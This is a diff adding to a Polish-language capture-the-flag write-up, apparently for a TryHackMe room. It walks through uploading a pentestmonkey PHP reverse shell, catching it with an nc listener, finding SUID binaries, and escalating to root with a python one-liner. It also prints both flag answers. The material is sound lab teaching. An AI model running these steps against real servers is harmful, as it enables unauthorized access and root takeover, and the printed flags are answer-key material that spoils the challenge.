@@ -57,6 +57,8 @@ Znajdujemy dwie ciekawe lokalizacje: /panel i /uploads:
 
 ![Uploads](img/Uploads.JPG)
 
+## Eksploitacja
+
 Pobieramy [skrypt](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) reverse-shell'a i próbujemy go wgrać:
 
 ![PHP](img/PHP.JPG)
@@ -79,6 +81,38 @@ nc -lvnp 4444
 
 ![Nc](img/Nc.JPG)
 
-Otrzymujemy dostęp do serwera przez reverse-shell'a
+Otrzymujemy dostęp do serwera przez reverse-shell'a. W pliku /var/www/user.txt znajdujemy pierwszą flagę:
 
+![Flag1](img/Flag1.JPG)
 
+```
+THM{y0u_g0t_a_sh3ll}
+```
+
+## Zwiększenie poziomu uprawnień
+
+Sprawdzamy, które programy mają ustawione uprawnienie SUID:
+
+```
+find / -perm -4000 2>/dev/null
+```
+
+![Python](img/Python.JPG)
+
+Program python jest nietypowy. Spróbujmy to wykorzystać za pomocą [gtfobins](https://gtfobins.github.io/gtfobins/python/):
+
+```
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
+
+![Root](img/Root.JPG)
+
+ W pliku /root/root.txt znajdujemy drugą flagę:
+
+![Flag2](img/Flag2.JPG)
+
+```
+THM{pr1v1l3g3_3sc4l4t10n}
+```
+
+Do zobaczenia na kolejnych CTF-ach!
